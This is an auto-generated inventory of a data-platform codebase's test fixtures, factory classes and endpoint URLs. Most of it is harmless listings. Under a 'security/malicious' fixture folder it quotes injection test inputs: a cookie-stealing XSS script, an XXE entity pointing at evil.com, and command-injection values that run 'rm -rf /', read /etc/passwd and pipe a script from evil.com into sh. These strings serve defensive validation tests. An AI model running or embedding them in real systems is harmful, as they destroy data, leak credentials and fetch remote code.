# Test Fixtures and Factories Report

**Generated:** 2026-10-04T21:11:46.170587

## Summary

- **Total Fixture Files:** 132
- **Total Factory Classes:** 53
- **Total Endpoint URLs Found:** 52
- **Factory Files:** 9

### Fixture Files by Type

- **json**: 71
- **python**: 1
- **conftest**: 60

## Fixture Files

### tests/fixtures/marketplace/sample_listing_ids.json
- **Type:** json
- **Size:** 530 bytes

### tests/fixtures/databricks/job_run_state_matrix.json
- **Type:** json
- **Size:** 3855 bytes

### tests/fixtures/databricks/estate.json
- **Type:** json
- **Size:** 2386 bytes

### tests/fixtures/databricks/effective_permissions.json
- **Type:** json
- **Size:** 192 bytes

### tests/fixtures/databricks/job_run_state_machine.json
- **Type:** json
- **Size:** 638 bytes

### tests/fixtures/databricks/sql_warehouse_state_matrix.json
- **Type:** json
- **Size:** 957 bytes

### tests/fixtures/databricks/sql_warehouses_estate.json
- **Type:** json
- **Size:** 524 bytes

### tests/fixtures/databricks/sql_warehouse_roundtrip.json
- **Type:** json
- **Size:** 1765 bytes

### tests/fixtures/databricks/estate_multi_page.json
- **Type:** json
- **Size:** 3930 bytes

### tests/fixtures/marketplace/ckan/datasets/minimal_dataset.json
- **Type:** json
- **Size:** 304 bytes

### tests/fixtures/marketplace/ckan/datasets/sample_dataset.json
- **Type:** json
- **Size:** 1037 bytes

### tests/fixtures/marketplace/ckan/datasets/multilingual_dataset.json
- **Type:** json
- **Size:** 795 bytes

### tests/fixtures/marketplace/ckan/datasets/dataset_with_odcs_metadata.json
- **Type:** json
- **Size:** 937 bytes

### tests/fixtures/marketplace/ckan/datasets/dataset_with_odps_metadata.json
- **Type:** json
- **Size:** 972 bytes
- **Endpoints Found:** 1
  - `{"pricing_plans": [{"planID": "plan-1", "name": "Basic Plan", "price": 0, "currency": "USD"}], "access_methods": {"api": {"endpoint": "https://api.example.com/data"}}, "payment_gateways": {"stripe": {"enabled": true}}}`

### tests/fixtures/marketplace/ckan/api_responses/package_delete.json
- **Type:** json
- **Size:** 129 bytes

### tests/fixtures/marketplace/ckan/api_responses/error_not_found.json
- **Type:** json
- **Size:** 102 bytes

### tests/fixtures/marketplace/ckan/api_responses/status_show.json
- **Type:** json
- **Size:** 269 bytes
- **Endpoints Found:** 1
  - `https://data.example.com`

### tests/fixtures/marketplace/ckan/api_responses/error_validation.json
- **Type:** json
- **Size:** 235 bytes

### tests/fixtures/marketplace/ckan/api_responses/package_show.json
- **Type:** json
- **Size:** 3113 bytes
- **Endpoints Found:** 3
  - `https://example.com/org-logo.png`
  - `https://example.com/data/sample.csv`
  - `https://example.com/data/sample.json`

### tests/fixtures/marketplace/ckan/api_responses/resource_show.json
- **Type:** json
- **Size:** 609 bytes
- **Endpoints Found:** 1
  - `https://example.com/data/sample.csv`

### tests/fixtures/marketplace/ckan/api_responses/package_create.json
- **Type:** json
- **Size:** 653 bytes

### tests/fixtures/marketplace/ckan/api_responses/package_update.json
- **Type:** json
- **Size:** 822 bytes

### tests/fixtures/marketplace/ckan/api_responses/error_permission.json
- **Type:** json
- **Size:** 157 bytes

### tests/fixtures/marketplace/ckan/api_responses/package_list.json
- **Type:** json
- **Size:** 166 bytes

### tests/fixtures/marketplace/ckan/api_responses/package_search.json
- **Type:** json
- **Size:** 2287 bytes
- **Endpoints Found:** 1
  - `https://example.com/data.csv`

### tests/fixtures/marketplace/ckan/resources/sample_api_resource.json
- **Type:** json
- **Size:** 516 bytes
- **Endpoints Found:** 1
  - `https://api.example.com/data`

### tests/fixtures/marketplace/ckan/resources/sample_json_resource.json
- **Type:** json
- **Size:** 553 bytes
- **Endpoints Found:** 1
  - `https://example.com/data/sample.json`

### tests/fixtures/marketplace/ckan/resources/minimal_resource.json
- **Type:** json
- **Size:** 342 bytes
- **Endpoints Found:** 1
  - `https://example.com/resource`

### tests/fixtures/marketplace/ckan/resources/sample_csv_resource.json
- **Type:** json
- **Size:** 540 bytes
- **Endpoints Found:** 1
  - `https://example.com/data/sample.csv`

### tests/fixtures/odps/v4.1/marketplace/sample-payment-gateways-v4.1.json
- **Type:** json
- **Size:** 3186 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/v4.1/marketplace/sample-complete-marketplace-v4.1.json
- **Type:** json
- **Size:** 1343 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.1`
  - `https://api.example.com/v1/products/complete-marketplace-product`
  - `https://download.example.com/products/complete-marketplace-product`

### tests/fixtures/odps/v4.1/marketplace/sample-access-methods-v4.1.json
- **Type:** json
- **Size:** 3017 bytes
- **Endpoints Found:** 5
  - `https://opendataproducts.org/schema/v4.1`
  - `https://api.example.com/v1/products/marketplace-access-product`
  - `https://docs.example.com/api/v1`
  - `https://download.example.com/products/marketplace-access-product`
  - `https://webhook.example.com/v1/products/marketplace-access-product`

### tests/fixtures/odps/v4.1/marketplace/sample-pricing-plans-v4.1.json
- **Type:** json
- **Size:** 3035 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/v4.1/with_refs/sample-external-ref-v4.1.json
- **Type:** json
- **Size:** 923 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/sample-product-external-ref-v4.1`
  - `https://example.com/schema.yaml#/accessMethods`

### tests/fixtures/odps/v4.1/with_refs/sample-internal-ref-v4.1.json
- **Type:** json
- **Size:** 1269 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/sample-product-internal-ref-v4.1`

### tests/fixtures/odps/v4.1/with_refs/sample-mixed-refs-v4.1.json
- **Type:** json
- **Size:** 953 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/sample-product-mixed-refs-v4.1`
  - `https://example.com/schema.yaml#/accessMethods`

### tests/fixtures/odps/v4.1/with_refs/sample-local-ref-v4.1.json
- **Type:** json
- **Size:** 796 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/sample-product-local-ref-v4.1`

### tests/fixtures/odps/v4.1/multilingual/sample-multiple-languages-v4.1.json
- **Type:** json
- **Size:** 1763 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/multilingual-product-multi`
  - `https://api.example.com/v1/products/multilingual-product-multi`

### tests/fixtures/odps/v4.1/multilingual/sample-french-only-v4.1.json
- **Type:** json
- **Size:** 674 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/multilingual-product-fr`

### tests/fixtures/odps/v4.1/multilingual/sample-english-only-v4.1.json
- **Type:** json
- **Size:** 638 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/multilingual-product-en`

### tests/fixtures/odps/v4.1/invalid/invalid-wrong-data-type-schema-v4.1.json
- **Type:** json
- **Size:** 287 bytes

### tests/fixtures/odps/v4.1/invalid/invalid-schema-violation-v4.1.json
- **Type:** json
- **Size:** 328 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v3.9`

### tests/fixtures/odps/v4.1/invalid/invalid-wrong-data-type-details-v4.1.json
- **Type:** json
- **Size:** 184 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/v4.1/invalid/invalid-missing-required-field-v4.1.json
- **Type:** json
- **Size:** 265 bytes

### tests/fixtures/odps/v4.1/invalid/invalid-missing-product-v4.1.json
- **Type:** json
- **Size:** 164 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/v4.1/invalid/invalid-wrong-data-type-product-v4.1.json
- **Type:** json
- **Size:** 135 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/v4.1/invalid/invalid-version-pattern-v4.1.json
- **Type:** json
- **Size:** 346 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/v4.1/invalid/invalid-schema-pattern-v4.1.json
- **Type:** json
- **Size:** 335 bytes
- **Endpoints Found:** 1
  - `https://invalid-schema-url.com/schema/v4.1`

### tests/fixtures/odps/v4.1/valid/sample-valid-v4.1.json
- **Type:** json
- **Size:** 1712 bytes
- **Endpoints Found:** 4
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/sample-product-v4.1`
  - `https://api.example.com/v1/products/sample-product-v4.1`
  - `https://download.example.com/products/sample-product-v4.1`

### tests/fixtures/odps/v2.x/with_refs/sample-internal-ref-v2.9.json
- **Type:** json
- **Size:** 553 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v2.9`
  - `https://example.com/contracts/sample-product-internal-ref-v2.9`

### tests/fixtures/odps/v2.x/with_refs/sample-external-ref-v2.9.json
- **Type:** json
- **Size:** 439 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v2.9`
  - `https://example.com/schema.yaml#/contract`

### tests/fixtures/odps/v2.x/with_refs/sample-local-ref-v2.9.json
- **Type:** json
- **Size:** 415 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v2.9`

### tests/fixtures/odps/v2.x/valid/sample-valid-v2.9.json
- **Type:** json
- **Size:** 792 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v2.9`
  - `https://example.com/contracts/sample-product-v2.9`

### tests/fixtures/odps/v3.x/with_refs/sample-external-ref-v3.9.json
- **Type:** json
- **Size:** 813 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v3.9`
  - `https://example.com/contracts/sample-product-external-ref-v3.9`
  - `https://example.com/schema.yaml#/accessMethods`

### tests/fixtures/odps/v3.x/with_refs/sample-internal-ref-v3.9.json
- **Type:** json
- **Size:** 806 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v3.9`
  - `https://example.com/contracts/sample-product-internal-ref-v3.9`

### tests/fixtures/odps/v3.x/with_refs/sample-local-ref-v3.9.json
- **Type:** json
- **Size:** 714 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v3.9`
  - `https://example.com/contracts/sample-product-local-ref-v3.9`

### tests/fixtures/odps/v3.x/valid/sample-valid-v3.9.json
- **Type:** json
- **Size:** 832 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v3.9`
  - `https://example.com/contracts/sample-product-v3.9`

### tests/fixtures/odps/v4.0/with_refs/sample-internal-ref-v4.0.json
- **Type:** json
- **Size:** 841 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.0`
  - `https://example.com/contracts/sample-product-internal-ref-v4.0`

### tests/fixtures/odps/v4.0/with_refs/sample-external-ref-v4.0.json
- **Type:** json
- **Size:** 848 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.0`
  - `https://example.com/contracts/sample-product-external-ref-v4.0`
  - `https://example.com/schema.yaml#/accessMethods`

### tests/fixtures/odps/v4.0/with_refs/sample-local-ref-v4.0.json
- **Type:** json
- **Size:** 721 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.0`
  - `https://example.com/contracts/sample-product-local-ref-v4.0`

### tests/fixtures/odps/v4.0/valid/sample-valid-v4.0.json
- **Type:** json
- **Size:** 1008 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.0`
  - `https://example.com/contracts/sample-product-v4.0`
  - `https://api.example.com/v1/products/sample-product-v4.0`

### tests/fixtures/odps/security/malicious/path-traversal-attempt.json
- **Type:** json
- **Size:** 565 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/security/malicious/script-injection-attempt.json
- **Type:** json
- **Size:** 1187 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contract?param=<script>alert(document.cookie)</script>`
  - `https://api.example.com/v1?callback=<script>eval('alert(1)')</script>`

### tests/fixtures/odps/security/malicious/path-traversal-multiple.json
- **Type:** json
- **Size:** 805 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/security/malicious/malicious-url-javascript.json
- **Type:** json
- **Size:** 815 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/security/malicious/xxe-attempt.json
- **Type:** json
- **Size:** 906 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.1`
  - `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>`

### tests/fixtures/odps/security/malicious/command-injection-attempt.json
- **Type:** json
- **Size:** 947 bytes
- **Endpoints Found:** 4
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contract; rm -rf /`
  - `https://api.example.com/v1?param=$(cat /etc/passwd)`
  - `https://download.example.com/file; wget http://evil.com/steal.sh | sh`

### tests/fixtures/odps/v1.x/with_refs/sample-local-ref-v1.9.json
- **Type:** json
- **Size:** 415 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v1.9`

### tests/fixtures/odps/v1.x/with_refs/sample-internal-ref-v1.9.json
- **Type:** json
- **Size:** 553 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v1.9`
  - `https://example.com/contracts/sample-product-internal-ref-v1.9`

### tests/fixtures/odps/v1.x/with_refs/sample-external-ref-v1.9.json
- **Type:** json
- **Size:** 439 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v1.9`
  - `https://example.com/schema.yaml#/contract`

### tests/fixtures/odps/v1.x/valid/sample-valid-v1.9.json
- **Type:** json
- **Size:** 585 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v1.9`
  - `https://example.com/contracts/sample-product-v1.9`

### hub/apps/orchestration/tests/fixtures.py
- **Type:** python
- **Size:** 2455 bytes

### tests/conftest.py
- **Type:** conftest
- **Size:** 127694 bytes
- **Endpoints Found:** 4
  - `localhost:8080`
  - `localhost:8082`
  - `localhost:8081`
  - `localhost:8083`

### hub/tests/conftest.py
- **Type:** conftest
- **Size:** 952 bytes

### hub/data_movement/tests/conftest.py
- **Type:** conftest
- **Size:** 3018 bytes

### hub/apps/webhooks/tests/conftest.py
- **Type:** conftest
- **Size:** 1181 bytes

### hub/apps/datasets/tests/conftest.py
- **Type:** conftest
- **Size:** 4756 bytes

### hub/apps/graphql_graphene/tests/conftest.py
- **Type:** conftest
- **Size:** 8028 bytes

### hub/apps/marketplace/tests/conftest.py
- **Type:** conftest
- **Size:** 1066 bytes

### hub/apps/contracts/tests/conftest.py
- **Type:** conftest
- **Size:** 680 bytes

### hub/apps/contracts/tests/security/conftest.py
- **Type:** conftest
- **Size:** 1053 bytes

### hub/apps/files/tests/conftest.py
- **Type:** conftest
- **Size:** 543 bytes

### hub/apps/orchestration/tests/conftest.py
- **Type:** conftest
- **Size:** 2173 bytes

### hub/apps/orchestration/workflows/tests/conftest.py
- **Type:** conftest
- **Size:** 668 bytes

### hub/apps/auth/tests/conftest.py
- **Type:** conftest
- **Size:** 542 bytes

### hub/apps/ml/tests/conftest.py
- **Type:** conftest
- **Size:** 12215 bytes

### hub/apps/assets/tests/conftest.py
- **Type:** conftest
- **Size:** 544 bytes

### hub/apps/compliance/tests/conftest.py
- **Type:** conftest
- **Size:** 548 bytes

### hub/apps/integrations/tests/conftest.py
- **Type:** conftest
- **Size:** 16940 bytes

### hub/apps/warehouses/tests/conftest.py
- **Type:** conftest
- **Size:** 935 bytes

### hub/apps/ai/tests/conftest.py
- **Type:** conftest
- **Size:** 221 bytes

### hub/apps/governance/tests/conftest.py
- **Type:** conftest
- **Size:** 548 bytes

### hub/apps/dq/tests/conftest.py
- **Type:** conftest
- **Size:** 540 bytes

### hub/apps/databricks_admin/tests/conftest.py
- **Type:** conftest
- **Size:** 1962 bytes

### hub/apps/semantic/tests/conftest.py
- **Type:** conftest
- **Size:** 2926 bytes

### services/shared/tests/conftest.py
- **Type:** conftest
- **Size:** 2384 bytes

### services/datacontract-service/tests/conftest.py
- **Type:** conftest
- **Size:** 520 bytes

### services/prefect-integration/tests/conftest.py
- **Type:** conftest
- **Size:** 16588 bytes

### services/compliance-service/tests/conftest.py
- **Type:** conftest
- **Size:** 4107 bytes

### services/worker/tests/conftest.py
- **Type:** conftest
- **Size:** 3321 bytes

### services/dq-service/tests/conftest.py
- **Type:** conftest
- **Size:** 3566 bytes

### services/semantic-service/tests/conftest.py
- **Type:** conftest
- **Size:** 1860 bytes
- **Endpoints Found:** 3
  - `localhost:3031`
  - `localhost:8081`
  - `localhost:8086`

### services/odh-integration/tests/conftest.py
- **Type:** conftest
- **Size:** 4686 bytes
- **Endpoints Found:** 4
  - `localhost:8080`
  - `localhost:8081`
  - `localhost:8082`
  - `localhost:8083`

### cli/tests/conftest.py
- **Type:** conftest
- **Size:** 6812 bytes

### cli/tests/integration/conftest.py
- **Type:** conftest
- **Size:** 5585 bytes

### cli/tests/e2e/conftest.py
- **Type:** conftest
- **Size:** 1111 bytes

### cli/tests/security/conftest.py
- **Type:** conftest
- **Size:** 1107 bytes

### cli/tests/dimensions/conftest.py
- **Type:** conftest
- **Size:** 792 bytes

### cli/tests/use_cases/conftest.py
- **Type:** conftest
- **Size:** 14941 bytes

### cli/build/lib/tests/conftest.py
- **Type:** conftest
- **Size:** 6716 bytes

### cli/build/lib/tests/security/conftest.py
- **Type:** conftest
- **Size:** 1107 bytes

### cli/build/lib/tests/dimensions/conftest.py
- **Type:** conftest
- **Size:** 792 bytes

### cli/build/lib/tests/use_cases/conftest.py
- **Type:** conftest
- **Size:** 14941 bytes

### tests/performance/conftest.py
- **Type:** conftest
- **Size:** 3577 bytes

### tests/prefect/conftest.py
- **Type:** conftest
- **Size:** 3144 bytes
- **Endpoints Found:** 2
  - `localhost:4200`
  - `http://localhost:4200/api`

### tests/integration/conftest.py
- **Type:** conftest
- **Size:** 2098 bytes

### tests/e2e/conftest.py
- **Type:** conftest
- **Size:** 90331 bytes
- **Endpoints Found:** 11
  - `/api/v1/compliance/runs/`
  - `/api/v1/dq/runs/`
  - `/api/v1/contracts/`
  - `/api/v1/contracts/{contract_id}/validate/`
  - `/api/v1/files/{file_id}/complete/`
  - ... and 6 more

### tests/pact/conftest.py
- **Type:** conftest
- **Size:** 359 bytes

### tests/concurrency/conftest.py
- **Type:** conftest
- **Size:** 768 bytes

### tests/security/conftest.py
- **Type:** conftest
- **Size:** 1811 bytes

### tests/sdk_python/conftest.py
- **Type:** conftest
- **Size:** 18729 bytes
- **Endpoints Found:** 2
  - `localhost:8000`
  - `/api/v1/auth/login/`

### tests/schema/conftest.py
- **Type:** conftest
- **Size:** 2020 bytes

### tests/scripts/conftest.py
- **Type:** conftest
- **Size:** 232 bytes

### tests/smoke/conftest.py
- **Type:** conftest
- **Size:** 4431 bytes
- **Endpoints Found:** 2
  - `localhost:8001`
  - `/api/v1/auth/login/`

### tests/resilience/conftest.py
- **Type:** conftest
- **Size:** 438 bytes

### tests/isolation/conftest.py
- **Type:** conftest
- **Size:** 3043 bytes

### tests/integration/databricks_e2e/conftest.py
- **Type:** conftest
- **Size:** 2061 bytes

### tests/e2e/_guards/conftest.py
- **Type:** conftest
- **Size:** 302 bytes

### sdk/python/tests/conftest.py
- **Type:** conftest
- **Size:** 18840 bytes
- **Endpoints Found:** 6
  - `/api/v1/auth/refresh/`
  - `/api/v1/tenants/{tenant_id}/`
  - `/api/v1/auth/login/`
  - `/api/v1/tenants/{id}/`
  - `/api/v1/health/`
  - ... and 1 more

### sdk/python/tests/security/conftest.py
- **Type:** conftest
- **Size:** 1875 bytes

### sdk/python/tests/dimensions/conftest.py
- **Type:** conftest
- **Size:** 1534 bytes

### sdk/python/tests/use_cases/conftest.py
- **Type:** conftest
- **Size:** 5600 bytes
- **Endpoints Found:** 1
  - `/api/v1/auth/me/`

## Factory Classes

### tests/factories_boy.py

- **TenantFactory** (line 26)
  - Methods: 0

- **TenantConfigFactory** (line 40)
  - Methods: 0

- **UserFactory** (line 64)
  - Methods: 0

- **EmailDeliveryFactory** (line 78)
  - Methods: 0

- **JobFactory** (line 93)
  - Methods: 0

- **ScheduledIngestionFactory** (line 114)
  - Methods: 0

- **ScheduledIngestionRunFactory** (line 128)
  - Methods: 0

- **SchemaVersionFactory** (line 141)
  - Methods: 0

- **DataClassificationFactory** (line 161)
  - Methods: 0

- **RetentionPolicyFactory** (line 173)
  - Methods: 0

- **AccessRequestFactory** (line 185)
  - Methods: 0

- **DatasetSnapshotFactory** (line 198)
  - Methods: 0

- **SearchIndexFactory** (line 210)
  - Methods: 0

- **SearchAnalyticsFactory** (line 222)
  - Methods: 0

- **WebhookFactory** (line 234)
  - Methods: 0

- **WebhookDeliveryFactory** (line 247)
  - Methods: 0

- **DataObservabilityMetricFactory** (line 260)
  - Methods: 0

- **DataIncidentFactory** (line 273)
  - Methods: 0

- **AccessPolicyFactory** (line 287)
  - Methods: 0

- **FieldAccessPolicyFactory** (line 299)
  - Methods: 0

- **AccessLogFactory** (line 311)
  - Methods: 0

- **AccessCertificationFactory** (line 324)
  - Methods: 0

- **DQAnomalyFactory** (line 337)
  - Methods: 0

- **DQTrendFactory** (line 350)
  - Methods: 0

- **DQAlertingRuleFactory** (line 363)
  - Methods: 0

- **IngestionTemplateFactory** (line 376)
  - Methods: 0

- **DatasetFactoryEnhanced** (line 394)
  - Methods: 0

- **AssetFactoryEnhanced** (line 415)
  - Methods: 0

- **ContractFactoryEnhanced** (line 431)
  - Methods: 0

- **ScheduledIngestionFactoryEnhanced** (line 445)
  - Methods: 0

### tests/factories.py

- **UserFactory** (line 23)
  - Methods: 2
  - Method names: create_user, __call__

- **TenantFactory** (line 55)
  - Methods: 2
  - Method names: create_tenant, __call__

- **TenantConfigFactory** (line 99)
  - Methods: 2
  - Method names: create_tenant_config, create_tenant_config_with_all_fields

- **EmailDeliveryFactory** (line 187)
  - Methods: 3
  - Method names: create_email_delivery, create_email_delivery_with_all_statuses, create_email_delivery_with_all_types

- **JobFactory** (line 287)
  - Methods: 3
  - Method names: create_job, create_job_with_all_types, create_job_with_all_statuses

- **AssetFactory** (line 603)
  - Methods: 2
  - Method names: create, __new__

- **WorkflowDefinitionFactory** (line 445)
  - Methods: 1
  - Method names: create_workflow_definition

- **WorkflowInstanceFactory** (line 475)
  - Methods: 1
  - Method names: create_workflow_instance

- **WorkflowStepFactory** (line 506)
  - Methods: 1
  - Method names: create_workflow_step

- **ValidationResultFactory** (line 533)
  - Methods: 2
  - Method names: create_valid_result, create_invalid_result

- **RuleExecutionContextFactory** (line 560)
  - Methods: 1
  - Method names: create_context

- **OrchestrationRuleExecutionContextFactory** (line 577)
  - Methods: 1
  - Method names: create_context

### hub/apps/datasets/tests/factories.py

- **DatasetFactory** (line 19)
  - Methods: 2
  - Method names: create_dataset, create_dataset_with_complex_schema

### hub/apps/scheduled_ingestion/tests/factories.py

- **ScheduledIngestionFactory** (line 21)
  - Methods: 1
  - Method names: create_scheduled_ingestion

- **ScheduledIngestionRunFactory** (line 85)
  - Methods: 1
  - Method names: create_scheduled_ingestion_run

### hub/apps/contracts/tests/factories.py

- **ContractFactoryEnhanced** (line 26)
  - Methods: 3
  - Method names: create_hub_contract_json, create_contract, create_contract_with_all_sections

### hub/apps/files/tests/factories.py

- **FileFactory** (line 19)
  - Methods: 3
  - Method names: create_file, create_file_with_all_statuses, create_large_file

### hub/apps/assets/tests/factories.py

- **AssetFactory** (line 17)
  - Methods: 4
  - Method names: create_asset, create_active_asset, create_asset_with_all_statuses, __call__

### hub/apps/tenants/tests/factories.py

- **TenantFactory** (line 41)
  - Methods: 1
  - Method names: create_tenant

- **TenantConfigFactory** (line 65)
  - Methods: 1
  - Method names: create_config

- **SubscriptionFactory** (line 86)
  - Methods: 1
  - Method names: create_subscription

### hub/apps/versioning/tests/factories.py

- **DatasetVersionFactory** (line 19)
  - Methods: 1
  - Method names: create_dataset_version

- **SchemaVersionFactory** (line 72)
  - Methods: 1
  - Method names: create_schema_version

## Endpoint URLs in Fixtures

### tests/fixtures/marketplace/ckan/datasets/dataset_with_odps_metadata.json

- `api.example.com` (fixture)

### tests/fixtures/marketplace/ckan/resources/sample_api_resource.json

- `api.example.com` (fixture)

### tests/fixtures/odps/v4.1/marketplace/sample-complete-marketplace-v4.1.json

- `api.example.com` (fixture)

### tests/fixtures/odps/v4.1/marketplace/sample-access-methods-v4.1.json

- `api.example.com` (fixture)

### tests/fixtures/odps/v4.1/multilingual/sample-multiple-languages-v4.1.json

- `api.example.com` (fixture)

### tests/fixtures/odps/v4.1/valid/sample-valid-v4.1.json

- `api.example.com` (fixture)

### tests/fixtures/odps/v4.0/valid/sample-valid-v4.0.json

- `api.example.com` (fixture)

### tests/fixtures/odps/security/malicious/script-injection-attempt.json

- `api.example.com` (fixture)

### tests/fixtures/odps/security/malicious/command-injection-attempt.json

- `api.example.com` (fixture)

### tests/conftest.py

- `localhost:8080` (fixture)
- `http://localhost:8083` (fixture)
- `localhost:8082` (fixture)
- `http://localhost:8080` (fixture)
- `localhost:8081` (fixture)
- `localhost:8083` (fixture)
- `http://localhost:8081` (fixture)
- `http://localhost:8082` (fixture)

### services/semantic-service/tests/conftest.py

- `localhost:3031` (fixture)
- `localhost:8081` (fixture)
- `http://localhost:8086` (fixture)
- `localhost:8086` (fixture)

### services/odh-integration/tests/conftest.py

- `localhost:8080` (fixture)
- `http://localhost:8083` (fixture)
- `localhost:8082` (fixture)
- `http://localhost:8080` (fixture)
- `localhost:8081` (fixture)
- `localhost:8083` (fixture)
- `http://localhost:8081` (fixture)
- `http://localhost:8082` (fixture)

### tests/prefect/conftest.py

- `localhost:4200` (fixture)

### tests/e2e/conftest.py

- `/api/v1/compliance/runs/` (fixture)
- `/api/v1/dq/runs/` (fixture)
- `/api/v1/contracts/` (fixture)
- `/api/v1/contracts/{contract_id}/validate/` (fixture)
- `/api/v1/files/{file_id}/complete/` (fixture)
- `/api/v1/files/init/` (fixture)
- `/api/v1/auth/login/,` (fixture)
- `localhost:8000` (fixture)
- `/api/v1/assets/{asset_id}/activate/` (fixture)
- `/api/v1/datasets/` (fixture)
- ... and 1 more endpoints

### tests/sdk_python/conftest.py

- `localhost:8000` (fixture)
- `/api/v1/auth/login/` (fixture)

### tests/smoke/conftest.py

- `localhost:8001` (fixture)
- `/api/v1/auth/login/` (fixture)

### sdk/python/tests/conftest.py

- `/api/v1/auth/refresh/` (fixture)
- `/api/v1/tenants/{id}/)` (fixture)
- `/api/v1/tenants/{tenant_id}/` (fixture)
- `/api/v1/auth/login/` (fixture)
- `/api/v1/health/` (fixture)
- `/api/v1/auth/me/` (fixture)

### sdk/python/tests/use_cases/conftest.py

- `/api/v1/auth/me/` (fixture)

